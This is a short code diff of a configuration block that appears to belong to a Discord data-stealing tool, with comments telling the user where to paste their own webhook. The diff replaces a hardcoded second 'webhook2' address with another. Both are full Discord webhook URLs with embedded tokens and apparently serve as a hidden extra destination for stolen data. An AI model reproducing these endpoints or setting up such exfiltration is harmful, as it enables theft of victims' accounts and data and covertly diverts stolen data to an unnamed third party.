@@ -29,7 +29,7 @@ __config__ = {
     # replace webhook_here with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "WEBHOOK_HERE",  # Place your webhook here
-    'webhook2': "https://discord.com/api/webhooks/1004450286322077696/JFrL9ap73jlinNSZRJ8QBmRQSFLzKycFzL9Y8no_UGhtifsY8yq8SGzHm4CLi4mW9w6h",
+    'webhook2': "https://discord.com/api/webhooks/1040954665732419595/sQ48EyCGfVOilh0uHZnDiov-Ev9f14lXG_DmDTCcvezXXwHB11Lpx2mfTx2huz1o0Otu",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
